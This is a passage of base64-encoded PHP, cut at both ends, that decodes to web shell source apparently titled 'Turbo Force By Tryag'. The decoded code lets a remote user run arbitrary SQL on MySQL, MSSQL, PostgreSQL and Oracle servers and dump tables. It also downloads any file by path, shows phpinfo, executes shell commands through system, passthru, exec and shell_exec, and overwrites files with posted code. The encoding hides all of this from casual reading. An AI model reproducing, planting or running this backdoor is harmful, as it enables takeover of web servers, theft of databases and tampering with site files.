R0aGlzLT5iYXNlKTsgaWYoaXNfcmVzb3VyY2UoJHRoaXMtPmNvbm5lY3Rpb24pKSByZXR1cm4gMTsgJGVycm9yID0gQG9jaWVycm9yKCk7ICR0aGlzLT5lcnJvcj0kZXJyb3JbJ21lc3NhZ2UnXTsgYnJlYWs7IH0NCiByZXR1cm4gMDsgfQ0KIGZ1bmN0aW9uIHNlbGVjdF9kYigpIA0KIHsNCiBzd2l0Y2goJHRoaXMtPmRiKSANCiB7DQogY2FzZSAnTXlTUUwnOiBpZihAbXlzcWxfc2VsZWN0X2RiKCR0aGlzLT5iYXNlLCR0aGlzLT5jb25uZWN0aW9uKSkgcmV0dXJuIDE7ICR0aGlzLT5lcnJvciA9IEBteXNxbF9lcnJubygpLiIgOiAiLkBteXNxbF9lcnJvcigpOyBicmVhazsgY2FzZSAnTVNTUUwnOiBpZihAbXNzcWxfc2VsZWN0X2RiKCR0aGlzLT5iYXNlLCR0aGlzLT5jb25uZWN0aW9uKSkgcmV0dXJuIDE7ICR0aGlzLT5lcnJvciA9ICJDYW4ndCBzZWxlY3QgZGF0YWJhc2UiOyBicmVhazsgY2FzZSAnUG9zdGdyZVNRTCc6IHJldHVybiAxOyBicmVhazsgY2FzZSAnT3JhY2xlJzogcmV0dXJuIDE7IGJyZWFrOyB9DQogcmV0dXJuIDA7IH0NCiBmdW5jdGlvbiBxdWVyeSgkcXVlcnkpIA0KIHsNCiAkdGhpcy0+cmVzPSR0aGlzLT5lcnJvcj0nJzsgc3dpdGNoKCR0aGlzLT5kYikgDQogew0KIGNhc2UgJ015U1FMJzogaWYoZmFsc2U9PT0oJHRoaXMtPnJlcz1AbXlzcWxfcXVlcnkoJy8qJy5jaHIoMCkuJyovJy4kcXVlcnksJHRoaXMtPmNvbm5lY3Rpb24pKSkgDQogew0KICR0aGlzLT5lcnJvciA9IEBteXNxbF9lcnJvcigkdGhpcy0+Y29ubmVjdGlvbik7IHJldHVybiAwOyB9DQogZWxzZSBpZihpc19yZXNvdXJjZSgkdGhpcy0+cmVzKSkgDQogew0KIHJldHVybiAxOyB9DQogcmV0dXJuIDI7IGJyZWFrOyBjYXNlICdNU1NRTCc6IGlmKGZhbHNlPT09KCR0aGlzLT5yZXM9QG1zc3FsX3F1ZXJ5KCRxdWVyeSwkdGhpcy0+Y29ubmVjdGlvbikpKSANCiB7DQogJHRoaXMtPmVycm9yID0gJ1F1ZXJ5IGVycm9yJzsgcmV0dXJuIDA7IH0NCiBlbHNlIGlmKEBtc3NxbF9udW1fcm93cygkdGhpcy0+cmVzKSA+IDApIA0KIHsNCiByZXR1cm4gMTsgfQ0KIHJldHVybiAyOyBicmVhazsgY2FzZSAnUG9zdGdyZVNRTCc6IGlmKGZhbHNlPT09KCR0aGlzLT5yZXM9QHBnX3F1ZXJ5KCR0aGlzLT5jb25uZWN0aW9uLCRxdWVyeSkpKSANCiB7DQogJHRoaXMtPmVycm9yID0gQHBnX2xhc3RfZXJyb3IoJHRoaXMtPmNvbm5lY3Rpb24pOyByZXR1cm4gMDsgfQ0KIGVsc2UgaWYoQHBnX251bV9yb3dzKCR0aGlzLT5yZXMpID4gMCkgDQogew0KIHJldHVybiAxOyB9DQogcmV0dXJuIDI7IGJyZWFrOyBjYXNlICdPcmFjbGUnOiBpZihmYWxzZT09PSgkdGhpcy0+cmVzPUBvY2lwYXJzZSgkdGhpcy0+Y29ubmVjdGlvbiwkcXVlcnkpKSkgDQogew0KICR0aGlzLT5lcnJvciA9ICdRdWVyeSBwYXJzZSBlcnJvcic7IH0NCiBlbHNlIA0KIHsNCiBpZihAb2NpZXhlY3V0ZSgkdGhpcy0+cmVzKSkgDQogew0KIGlmKEBvY2lyb3djb3VudCgkdGhpcy0+cmVzKSAhPSAwKSByZXR1cm4gMjsgcmV0dXJuIDE7IH0NCiAkZXJyb3IgPSBAb2NpZXJyb3IoKTsgJHRoaXMtPmVycm9yPSRlcnJvclsnbWVzc2FnZSddOyB9DQogYnJlYWs7IH0NCiByZXR1cm4gMDsgfQ0KIGZ1bmN0aW9uIGdldF9yZXN1bHQoKSANCiB7DQogJHRoaXMtPnJvd3M9YXJyYXkoKTsgJHRoaXMtPmNvbHVtbnM9YXJyYXkoKTsgJHRoaXMtPm51bV9yb3dzPSR0aGlzLT5udW1fZmllbGRzPTA7IHN3aXRjaCgkdGhpcy0+ZGIpIA0KIHsNCiBjYXNlICdNeVNRTCc6ICR0aGlzLT5udW1fcm93cz1AbXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlcyk7ICR0aGlzLT5udW1fZmllbGRzPUBteXNxbF9udW1fZmllbGRzKCR0aGlzLT5yZXMpOyB3aGlsZShmYWxzZSAhPT0gKCR0aGlzLT5yb3dzW10gPSBAbXlzcWxfZmV0Y2hfYXNzb2MoJHRoaXMtPnJlcykpKTsgQG15c3FsX2ZyZWVfcmVzdWx0KCR0aGlzLT5yZXMpOyBpZigkdGhpcy0+bnVtX3Jvd3MpDQogew0KJHRoaXMtPmNvbHVtbnMgPSBAYXJyYXlfa2V5cygkdGhpcy0+cm93c1swXSk7IHJldHVybiAxO30NCiBicmVhazsgY2FzZSAnTVNTUUwnOiAkdGhpcy0+bnVtX3Jvd3M9QG1zc3FsX251bV9yb3dzKCR0aGlzLT5yZXMpOyAkdGhpcy0+bnVtX2ZpZWxkcz1AbXNzcWxfbnVtX2ZpZWxkcygkdGhpcy0+cmVzKTsgd2hpbGUoZmFsc2UgIT09ICgkdGhpcy0+cm93c1tdID0gQG1zc3FsX2ZldGNoX2Fzc29jKCR0aGlzLT5yZXMpKSk7IEBtc3NxbF9mcmVlX3Jlc3VsdCgkdGhpcy0+cmVzKTsgaWYoJHRoaXMtPm51bV9yb3dzKQ0KIHsNCiR0aGlzLT5jb2x1bW5zID0gQGFycmF5X2tleXMoJHRoaXMtPnJvd3NbMF0pOyByZXR1cm4gMTt9DQo7IGJyZWFrOyBjYXNlICdQb3N0Z3JlU1FMJzogJHRoaXMtPm51bV9yb3dzPUBwZ19udW1fcm93cygkdGhpcy0+cmVzKTsgJHRoaXMtPm51bV9maWVsZHM9QHBnX251bV9maWVsZHMoJHRoaXMtPnJlcyk7IHdoaWxlKGZhbHNlICE9PSAoJHRoaXMtPnJvd3NbXSA9IEBwZ19mZXRjaF9hc3NvYygkdGhpcy0+cmVzKSkpOyBAcGdfZnJlZV9yZXN1bHQoJHRoaXMtPnJlcyk7IGlmKCR0aGlzLT5udW1fcm93cykNCiB7DQokdGhpcy0+Y29sdW1ucyA9IEBhcnJheV9rZXlzKCR0aGlzLT5yb3dzWzBdKTsgcmV0dXJuIDE7fQ0KIGJyZWFrOyBjYXNlICdPcmFjbGUnOiAkdGhpcy0+bnVtX2ZpZWxkcz1Ab2NpbnVtY29scygkdGhpcy0+cmVzKTsgd2hpbGUoZmFsc2UgIT09ICgkdGhpcy0+cm93c1tdID0gQG9jaV9mZXRjaF9hc3NvYygkdGhpcy0+cmVzKSkpICR0aGlzLT5udW1fcm93cysrOyBAb2NpZnJlZXN0YXRlbWVudCgkdGhpcy0+cmVzKTsgaWYoJHRoaXMtPm51bV9yb3dzKQ0KIHsNCiR0aGlzLT5jb2x1bW5zID0gQGFycmF5X2tleXMoJHRoaXMtPnJvd3NbMF0pOyByZXR1cm4gMTt9DQogYnJlYWs7IH0NCiByZXR1cm4gMDsgfQ0KIGZ1bmN0aW9uIGR1bXAoJHRhYmxlKSANCiB7DQogaWYoZW1wdHkoJHRhYmxlKSkgcmV0dXJuIDA7ICR0aGlzLT5kdW1wPWFycmF5KCk7ICR0aGlzLT5kdW1wWzBdID0gJyMjJzsgJHRoaXMtPmR1bXBbMV0gPSAnIyMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICc7ICR0aGlzLT5kdW1wWzJdID0gJyMjICBDcmVhdGVkOiAnLmRhdGUgKCJkL20vWSBIOmk6cyIpOyAkdGhpcy0+ZHVtcFszXSA9ICcjIyBEYXRhYmFzZTogJy4kdGhpcy0+YmFzZTsgJHRoaXMtPmR1bXBbNF0gPSAnIyMgICAgVGFibGU6ICcuJHRhYmxlOyAkdGhpcy0+ZHVtcFs1XSA9ICcjIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJzsgc3dpdGNoKCR0aGlzLT5kYikgDQogew0KIGNhc2UgJ015U1FMJzogJHRoaXMtPmR1bXBbMF0gPSAnIyMgTXlTUUwgZHVtcCc7IGlmKCR0aGlzLT5xdWVyeSgnLyonLmNocigwKS4nKi8gU0hPVyBDUkVBVEUgVEFCTEUgYCcuJHRhYmxlLidgJykhPTEpIHJldHVybiAwOyBpZighJHRoaXMtPmdldF9yZXN1bHQoKSkgcmV0dXJuIDA7ICR0aGlzLT5kdW1wW10gPSAkdGhpcy0+cm93c1swXVsnQ3JlYXRlIFRhYmxlJ10uIjsiOyAkdGhpcy0+ZHVtcFtdID0gJyMjIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAnOyBpZigkdGhpcy0+cXVlcnkoJy8qJy5jaHIoMCkuJyovIFNFTEVDVCAqIEZST00gYCcuJHRhYmxlLidgJykhPTEpIHJldHVybiAwOyBpZighJHRoaXMtPmdldF9yZXN1bHQoKSkgcmV0dXJuIDA7IGZvcigkaT0wOyRpPCR0aGlzLT5udW1fcm93czskaSsrKSANCiB7DQogZm9yZWFjaCgkdGhpcy0+cm93c1skaV0gYXMgJGs9PiR2KSANCiB7DQokdGhpcy0+cm93c1skaV1bJGtdID0gQG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygkdik7fQ0KICR0aGlzLT5kdW1wW10gPSAnSU5TRVJUIElOVE8gYCcuJHRhYmxlLidgIChgJy5AaW1wbG9kZSgiYCwgYCIsICR0aGlzLT5jb2x1bW5zKS4nYCkgVkFMVUVTIChcJycuQGltcGxvZGUoIicsICciLCAkdGhpcy0+cm93c1skaV0pLidcJyk7JzsgfQ0KIGJyZWFrOyBjYXNlICdNU1NRTCc6ICR0aGlzLT5kdW1wWzBdID0gJyMjIE1TU1FMIGR1bXAnOyBpZigkdGhpcy0+cXVlcnkoJ1NFTEVDVCAqIEZST00gJy4kdGFibGUpIT0xKSByZXR1cm4gMDsgaWYoISR0aGlzLT5nZXRfcmVzdWx0KCkpIHJldHVybiAwOyBmb3IoJGk9MDskaTwkdGhpcy0+bnVtX3Jvd3M7JGkrKykgDQogew0KIGZvcmVhY2goJHRoaXMtPnJvd3NbJGldIGFzICRrPT4kdikgDQogew0KJHRoaXMtPnJvd3NbJGldWyRrXSA9IEBhZGRzbGFzaGVzKCR2KTt9DQogJHRoaXMtPmR1bXBbXSA9ICdJTlNFUlQgSU5UTyAnLiR0YWJsZS4nICgnLkBpbXBsb2RlKCIsICIsICR0aGlzLT5jb2x1bW5zKS4nKSBWQUxVRVMgKFwnJy5AaW1wbG9kZSgiJywgJyIsICR0aGlzLT5yb3dzWyRpXSkuJ1wnKTsnOyB9DQogYnJlYWs7IGNhc2UgJ1Bvc3RncmVTUUwnOiAkdGhpcy0+ZHVtcFswXSA9ICcjIyBQb3N0Z3JlU1FMIGR1bXAnOyBpZigkdGhpcy0+cXVlcnkoJ1NFTEVDVCAqIEZST00gJy4kdGFibGUpIT0xKSByZXR1cm4gMDsgaWYoISR0aGlzLT5nZXRfcmVzdWx0KCkpIHJldHVybiAwOyBmb3IoJGk9MDskaTwkdGhpcy0+bnVtX3Jvd3M7JGkrKykgDQogew0KIGZvcmVhY2goJHRoaXMtPnJvd3NbJGldIGFzICRrPT4kdikgDQogew0KJHRoaXMtPnJvd3NbJGldWyRrXSA9IEBhZGRzbGFzaGVzKCR2KTt9DQogJHRoaXMtPmR1bXBbXSA9ICdJTlNFUlQgSU5UTyAnLiR0YWJsZS4nICgnLkBpbXBsb2RlKCIsICIsICR0aGlzLT5jb2x1bW5zKS4nKSBWQUxVRVMgKFwnJy5AaW1wbG9kZSgiJywgJyIsICR0aGlzLT5yb3dzWyRpXSkuJ1wnKTsnOyB9DQogYnJlYWs7IGNhc2UgJ09yYWNsZSc6ICR0aGlzLT5kdW1wWzBdID0gJyMjIE9SQUNMRSBkdW1wJzsgJHRoaXMtPmR1bXBbXSA9ICcjIyB1bmRlciBjb25zdHJ1Y3Rpb24nOyBicmVhazsgZGVmYXVsdDogcmV0dXJuIDA7IGJyZWFrOyB9DQogcmV0dXJuIDE7IH0NCiBmdW5jdGlvbiBjbG9zZSgpIA0KIHsNCiBzd2l0Y2goJHRoaXMtPmRiKSANCiB7DQogY2FzZSAnTXlTUUwnOiBAbXlzcWxfY2xvc2UoJHRoaXMtPmNvbm5lY3Rpb24pOyBicmVhazsgY2FzZSAnTVNTUUwnOiBAbXNzcWxfY2xvc2UoJHRoaXMtPmNvbm5lY3Rpb24pOyBicmVhazsgY2FzZSAnUG9zdGdyZVNRTCc6IEBwZ19jbG9zZSgkdGhpcy0+Y29ubmVjdGlvbik7IGJyZWFrOyBjYXNlICdPcmFjbGUnOiBAb2NpX2Nsb3NlKCR0aGlzLT5jb25uZWN0aW9uKTsgYnJlYWs7IH0NCiB9DQogZnVuY3Rpb24gYWZmZWN0ZWRfcm93cygpIA0KIHsNCiBzd2l0Y2goJHRoaXMtPmRiKSANCiB7DQogY2FzZSAnTXlTUUwnOiByZXR1cm4gQG15c3FsX2FmZmVjdGVkX3Jvd3MoJHRoaXMtPnJlcyk7IGJyZWFrOyBjYXNlICdNU1NRTCc6IHJldHVybiBAbXNzcWxfYWZmZWN0ZWRfcm93cygkdGhpcy0+cmVzKTsgYnJlYWs7IGNhc2UgJ1Bvc3RncmVTUUwnOiByZXR1cm4gQHBnX2FmZmVjdGVkX3Jvd3MoJHRoaXMtPnJlcyk7IGJyZWFrOyBjYXNlICdPcmFjbGUnOiByZXR1cm4gQG9jaXJvd2NvdW50KCR0aGlzLT5yZXMpOyBicmVhazsgZGVmYXVsdDogcmV0dXJuIDA7IGJyZWFrOyB9DQogfQ0KIH0NCiBpZighZW1wdHkoJF9QT1NUWydjY2NjJ10pICYmICRfUE9TVFsnY2NjYyddPT0iZG93bmxvYWRfZmlsZSIgJiYgIWVtcHR5KCRfUE9TVFsnZF9uYW1lJ10pKSANCiB7DQogaWYoISRmaWxlPUBmb3BlbigkX1BPU1RbJ2RfbmFtZSddLCJyIikpIA0KIHsNCiBlcnIoMSwkX1BPU1RbJ2RfbmFtZSddKTsgJF9QT1NUWydjY2NjJ109IiI7IH0NCiBlbHNlIA0KIHsNCiBAb2JfY2xlYW4oKTsgJGZpbGVuYW1lID0gQGJhc2VuYW1lKCRfUE9TVFsnZF9uYW1lJ10pOyAkZmlsZWR1bXAgPSBAZnJlYWQoJGZpbGUsQGZpbGVzaXplKCRfUE9TVFsnZF9uYW1lJ10pKTsgZmNsb3NlKCRmaWxlKTsgJGNvbnRlbnRfZW5jb2Rpbmc9JG1pbWVfdHlwZT0nJzsgY29tcHJlc3MoJGZpbGVuYW1lLCRmaWxlZHVtcCwkX1BPU1RbJ2NvbXByZXNzJ10pOyBpZiAoIWVtcHR5KCRjb250ZW50X2VuY29kaW5nKSkgDQogew0KIGhlYWRlcignQ29udGVudC1FbmNvZGluZzogJyAuICRjb250ZW50X2VuY29kaW5nKTsgfQ0KIGhlYWRlcigiQ29udGVudC10eXBlOiAiLiRtaW1lX3R5cGUpOyBoZWFkZXIoIkNvbnRlbnQtZGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPVwiIi4kZmlsZW5hbWUuIlwiOyIpOyBlY2hvICRmaWxlZHVtcDsgZXhpdCgpOyB9DQogfQ0KIGlmKGlzc2V0KCRfR0VUWydwaHBpbmZvJ10pKSANCiB7DQogZWNobyBAcGhwaW5mbygpOyBlY2hvICI8YnI+PGRpdiBhbGlnbj1jZW50ZXI+PGZvbnQgZmFjZT1WZXJkYW5hIHNpemU9LTI+PGI+WyA8YSBocmVmPSIuJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIj5CQUNLPC9hPiBdPC9iPjwvZm9udD48L2Rpdj4iOyBkaWUoKTsgfQ0KIGlmICghZW1wdHkoJF9QT1NUWydjY2NjJ10pICYmICRfUE9TVFsnY2NjYyddPT0iZGJfcXVlcnkiKSANCiB7DQogZWNobyAkaGVhZDsgJHNxbCA9IG5ldyBteV9zcWwoKTsgJHNxbC0+ZGIgPSAkX1BPU1RbJ2RiJ107ICRzcWwtPmhvc3QgPSAkX1BPU1RbJ2RiX3NlcnZlciddOyAkc3FsLT5wb3J0ID0gJF9QT1NUWydkYl9wb3J0J107ICRzcWwtPnVzZXIgPSAkX1BPU1RbJ215c3FsX2wnXTsgJHNxbC0+cGFzcyA9ICRfUE9TVFsnbXlzcWxfcCddOyAkc3FsLT5iYXNlID0gJF9QT1NUWydteXNxbF9kYiddOyAkcXVlcnlzID0gQGV4cGxvZGUoJzsnLCRfUE9TVFsnZGJfcXVlcnknXSk7IGVjaG8gJzxib2R5IGJnY29sb3I9I2U0ZTBkOD4nOyBpZighJHNxbC0+Y29ubmVjdCgpKSBlY2hvICI8ZGl2IGFsaWduPWNlbnRlcj48Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMiBjb2xvcj1yZWQ+PGI+Ii4kc3FsLT5lcnJvci4iPC9iPjwvZm9udD48L2Rpdj4iOyBlbHNlIA0KIHsNCiBpZighZW1wdHkoJHNxbC0+YmFzZSkmJiEkc3FsLT5zZWxlY3RfZGIoKSkgZWNobyAiPGRpdiBhbGlnbj1jZW50ZXI+PGZvbnQgZmFjZT1WZXJkYW5hIHNpemU9LTIgY29sb3I9cmVkPjxiPiIuJHNxbC0+ZXJyb3IuIjwvYj48L2ZvbnQ+PC9kaXY+IjsgZWxzZSANCiB7DQogZm9yZWFjaCgkcXVlcnlzIGFzICRudW09PiRxdWVyeSkgDQogew0KIGlmKHN0cmxlbigkcXVlcnkpPjUpIA0KIHsNCiBlY2hvICI8Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMiBjb2xvcj1ncmVlbj48Yj5RdWVyeSMiLiRudW0uIiA6ICIuaHRtbHNwZWNpYWxjaGFycygkcXVlcnksRU5UX1FVT1RFUykuIjwvYj48L2ZvbnQ+PGJyPiI7IHN3aXRjaCgkc3FsLT5xdWVyeSgkcXVlcnkpKSANCiB7DQogY2FzZSAnMCc6IGVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlPjx0cj48dGQ+PGZvbnQgZmFjZT1WZXJkYW5hIHNpemU9LTI+RXJyb3IgOiA8Yj4iLiRzcWwtPmVycm9yLiI8L2I+PC9mb250PjwvdGQ+PC90cj48L3RhYmxlPiI7IGJyZWFrOyBjYXNlICcxJzogaWYoJHNxbC0+Z2V0X3Jlc3VsdCgpKSANCiB7DQogZWNobyAiPHRhYmxlIHdpZHRoPTEwMCU+IjsgZm9yZWFjaCgkc3FsLT5jb2x1bW5zIGFzICRrPT4kdikgJHNxbC0+Y29sdW1uc1ska10gPSBodG1sc3BlY2lhbGNoYXJzKCR2LEVOVF9RVU9URVMpOyAka2V5cyA9IEBpbXBsb2RlKCImbmJzcDs8L2I+PC9mb250PjwvdGQ+PHRkIGJnY29sb3I9IzgwMDAwMD48Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMj48Yj4mbmJzcDsiLCAkc3FsLT5jb2x1bW5zKTsgZWNobyAiPHRyPjx0ZCBiZ2NvbG9yPSM4MDAwMDA+PGZvbnQgZmFjZT1WZXJkYW5hIHNpemU9LTI+PGI+Jm5ic3A7Ii4ka2V5cy4iJm5ic3A7PC9iPjwvZm9udD48L3RkPjwvdHI+IjsgZm9yKCRpPTA7JGk8JHNxbC0+bnVtX3Jvd3M7JGkrKykgDQogew0KIGZvcmVhY2goJHNxbC0+cm93c1skaV0gYXMgJGs9PiR2KSAkc3FsLT5yb3dzWyRpXVska10gPSBodG1sc3BlY2lhbGNoYXJzKCR2LEVOVF9RVU9URVMpOyAkdmFsdWVzID0gQGltcGxvZGUoIiZuYnNwOzwvZm9udD48L3RkPjx0ZD48Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMj4mbmJzcDsiLCRzcWwtPnJvd3NbJGldKTsgZWNobyAnPHRyPjx0ZD48Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMj4mbmJzcDsnLiR2YWx1ZXMuJyZuYnNwOzwvZm9udD48L3RkPjwvdHI+JzsgfQ0KIGVjaG8gIjwvdGFibGU+IjsgfQ0KIGJyZWFrOyBjYXNlICcyJzogJGFyID0gJHNxbC0+YWZmZWN0ZWRfcm93cygpPygkc3FsLT5hZmZlY3RlZF9yb3dzKCkpOignMCcpOyBlY2hvICI8dGFibGUgd2lkdGg9MTAwJT48dHI+PHRkPjxmb250IGZhY2U9VmVyZGFuYSBzaXplPS0yPmFmZmVjdGVkIHJvd3MgOiA8Yj4iLiRhci4iPC9iPjwvZm9udD48L3RkPjwvdHI+PC90YWJsZT48YnI+IjsgYnJlYWs7IH0NCiB9DQogfQ0KIH0NCiB9DQogZWNobyAiPGJyPjx0aXRsZT5UdXJibyBGb3JjZSBCeSBUcnlhZzwvdGl0bGU+PGZvcm0gbmFtZT1mb3JtIG1ldGhvZD1QT1NUPiI7IA0KIGVjaG8gaW4oJ2hpZGRlbicsJ2RiJywwLCRfUE9TVFsnZGInXSk7IGVjaG8gaW4oJ2hpZGRlbicsJ2RiX3NlcnZlcicsMCwkX1BPU1RbJ2RiX3NlcnZlciddKTsgZWNobyBpbignaGlkZGVuJywnZGJfcG9ydCcsMCwkX1BPU1RbJ2RiX3BvcnQnXSk7IGVjaG8gaW4oJ2hpZGRlbicsJ215c3FsX2wnLDAsJF9QT1NUWydteXNxbF9sJ10pOyBlY2hvIGluKCdoaWRkZW4nLCdteXNxbF9wJywwLCRfUE9TVFsnbXlzcWxfcCddKTsgZWNobyBpbignaGlkZGVuJywnbXlzcWxfZGInLDAsJF9QT1NUWydteXNxbF9kYiddKTsgZWNobyBpbignaGlkZGVuJywnY2NjYycsMCwnZGJfcXVlcnknKTsgDQogZWNobyAiPGRpdiBhbGlnbj1jZW50ZXI+IjsgZWNobyAiPGZvbnQgZmFjZT1WZXJkYW5hIHNpemU9LTI+PGI+QmFzZTogPC9iPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1teXNxbF9kYiB2YWx1ZT1cIiIuJHNxbC0+YmFzZS4iXCI+PC9mb250Pjxicj4iOyBlY2hvICI8dGV4dGFyZWEgY29scz02NSByb3dzPTEwIG5hbWU9ZGJfcXVlcnk+Ii4oIWVtcHR5KCRfUE9TVFsnZGJfcXVlcnknXSk/KCRfUE9TVFsnZGJfcXVlcnknXSk6KCJTSE9XIERBVEFCQVNFUztcblNFTEVDVCAqIEZST00gdXNlcjsiKSkuIjwvdGV4dGFyZWE+PGJyPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1Ym1pdCB2YWx1ZT1cIiBSdW4gU1FMIHF1ZXJ5IFwiPjwvZGl2Pjxicj48YnI+IjsgZWNobyAiPC9mb3JtPiI7IGVjaG8gIjxicj48ZGl2IGFsaWduPWNlbnRlcj48Zm9udCBmYWNlPVZlcmRhbmEgc2l6ZT0tMj48Yj5bIDxhIGhyZWY9Ii4kX1NFUlZFUlsnUEhQX1NFTEYnXS4iPkJBQ0s8L2E+IF08L2I+PC9mb250PjwvZGl2PiI7IGRpZSgpOyB9DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KZnVuY3Rpb24gY2NtbWRkKCRjY21tZGQyLCRhdHQpDQp7DQpnbG9iYWwgJGNjbW1kZDIsJGF0dDsNCmVjaG8gJw0KPHRhYmxlIHN0eWxlPSJ3aWR0aDogMTAwJSIgY2xhc3M9InN0eWxlMSIgZGlyPSJydGwiPg0KCTx0cj4NCgkJPHRkIGNsYXNzPSJzdHlsZTkiPjxzdHJvbmc+Pz8/PyA/Pz8/Pz88L3N0cm9uZz48L3RkPg0KCTwvdHI+DQoJPHRyPg0KCQk8dGQgY2xhc3M9InN0eWxlMTMiPg0KCQkJCTxmb3JtIG1ldGhvZD0icG9zdCI+DQoJCQkJCTxzZWxlY3QgbmFtZT0iYXR0IiBkaXI9InJ0bCIgc3R5bGU9ImhlaWdodDogMTA5cHgiIHNpemU9IjYiPg0KJzsNCmlmKCRfUE9TVFsnYXR0J109PW51bGwpDQp7DQplY2hvICcJCQkJCQk8b3B0aW9uIHZhbHVlPSJzeXN0ZW0iIHNlbGVjdGVkPSIiPnN5c3RlbTwvb3B0aW9uPic7DQp9ZWxzZXsNCmVjaG8gIgkJCQkJCTxvcHRpb24gdmFsdWU9JyRfUE9TVFthdHRdJyBzZWxlY3RlZD0nJz4kX1BPU1RbYXR0XTwvb3B0aW9uPg0KCQkJCQkJPG9wdGlvbiB2YWx1ZT1zeXN0ZW0+c3lzdGVtPC9vcHRpb24+DQoiOw0KDQoJCQkJCQkNCn0NCg0KZWNobyAnDQoJCQkJCQk8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+cGFzc3RocnU8L29wdGlvbj4NCgkJCQkJCTxvcHRpb24gdmFsdWU9ImV4ZWMiPmV4ZWM8L29wdGlvbj4NCgkJCQkJCTxvcHRpb24gdmFsdWU9InNoZWxsX2V4ZWMiPnNoZWxsX2V4ZWM8L29wdGlvbj4JDQoJCQkJCTwvc2VsZWN0Pg0KCQkJCQkJPGlucHV0IG5hbWU9InBhZ2UiIHZhbHVlPSJjY21tZGQiIHR5cGU9ImhpZGRlbiI+PGJyPg0KCQkJCQkJPGlucHV0IGRpcj0ibHRyIiBuYW1lPSJjY21tZGQyIiBzdHlsZT0id2lkdGg6IDE3M3B4IiB0eXBlPSJ0ZXh0IiB2YWx1ZT0iJztpZighJF9QT1NUWydjY21tZGQyJ10pe2VjaG8gJ2Rpcic7fWVsc2V7ZWNobyAkX1BPU1RbJ2NjbW1kZDInXTt9ZWNobyAnIj48YnI+DQoJCQkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iPz8/Pz8iPg0KCQkJCTwvZm9ybT4NCgkJDQoJCTwvdGQ+DQoJPC90cj4NCgk8dHI+DQoJCTx0ZCBjbGFzcz0ic3R5bGUxMyI+DQonOw0KDQoJCWlmKCRfUE9TVFthdHRdPT0nc3lzdGVtJykNCgkJew0KZWNobyAnDQoJCQkJCTx0ZXh0YXJlYSBkaXI9Imx0ciIgbmFtZT0iVGV4dEFyZWExIiBzdHlsZT0id2lkdGg6IDc0NXB4OyBoZWlnaHQ6IDIwNHB4Ij4nOw0KCQkJCQlzeXN0ZW0oJF9QT1NUWydjY21tZGQyJ10pOw0KZWNobyAnCQkJCQk8L3RleHRhcmVhPic7DQoNCg0KCQl9DQoNCgkJaWYoJF9QT1NUW2F0dF09PSdwYXNzdGhydScpDQoJCXsNCmVjaG8gJw0KCQkJCQk8dGV4dGFyZWEgZGlyPSJsdHIiIG5hbWU9IlRleHRBcmVhMSIgc3R5bGU9IndpZHRoOiA3NDVweDsgaGVpZ2h0OiAyMDRweCI+JzsNCgkJCQkJcGFzc3RocnUoJF9QT1NUWydjY21tZGQyJ10pOw0KZWNobyAnCQkJCQk8L3RleHRhcmVhPic7DQoNCg0KCQl9DQoNCgkJDQoNCg0KDQoJCWlmKCRfUE9TVFthdHRdPT0nZXhlYycpDQoJCXsNCg0KZWNobyAnCQkJCQk8dGV4dGFyZWEgZGlyPSJsdHIiIG5hbWU9IlRleHRBcmVhMSIgc3R5bGU9IndpZHRoOiA3NDVweDsgaGVpZ2h0OiAyMDRweCI+JzsNCgkJCQkJZXhlYygkX1BPU1RbJ2NjbW1kZDInXSwkcmVzKTsNCgkJCQllY2hvICRyZXMgPSBqb2luKCJcbiIsJHJlcyk7IAkJCQkNCmVjaG8gJwkJCQkJPC90ZXh0YXJlYT4nOw0KDQoNCgkJfQ0KDQoNCg0KDQoNCg0KDQoJCWlmKCRfUE9TVFthdHRdPT0nc2hlbGxfZXhlYycpDQoJCXsNCg0KZWNobyAnCQkJCQk8dGV4dGFyZWEgZGlyPSJsdHIiIG5hbWU9IlRleHRBcmVhMSIgc3R5bGU9IndpZHRoOiA3NDVweDsgaGVpZ2h0OiAyMDRweCI+JzsNCgkJCQllY2hvCXNoZWxsX2V4ZWMoJF9QT1NUWydjY21tZGQyJ10pOw0KZWNobyAnCQkJCQk8L3RleHRhcmVhPic7DQoNCg0KCQl9DQplY2hvICcJCQ0KCQk8L3RkPg0KCTwvdHI+DQo8L3RhYmxlPg0KJzsNCg0KZXhpdDsNCn0NCg0KaWYoJF9QT1NUWydwYWdlJ109PSdlZGl0JykNCnsNCg0KJGNvZGU9QHN0cl9yZXBsYWNlKCJcclxuIiwiXG4iLCRfUE9TVFsnY29kZSddKTsNCiRjb2RlPUBzdHJfcmVwbGFjZSgnXFwnLCcnLCRjb2RlKTsNCiRmcCA9IGZvcGVuKCRwYXRoY2xhc3MsICd3Jyk7DQpmd3JpdGUoJGZwLCIkY29kZSIpOw0KZmNsb3NlKCRmcCk7DQplY2hvICI8Y2VudGVyPjxiPk9LIEVkaXQ8YnI+PGJyPjxicj48YnI+PGEgaHJlZj0iLiRfU0VSVkVSWydQSFBfU0VMRiddLiI+QkFDSzwvYT4iOw0KZXhpdDsNCn0JDQoNCg0KDQoNCg0KDQoNCglpZigkX1BPU1RbJ3BhZ2UnXT09J3Nob3cnKQ0KCXsNCgkkcGF0aGNsYXNzID0kX1BPU1RbJ3BhdGhjbGFzcyddOw0KZWNobyAnDQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IHR5cGU9Im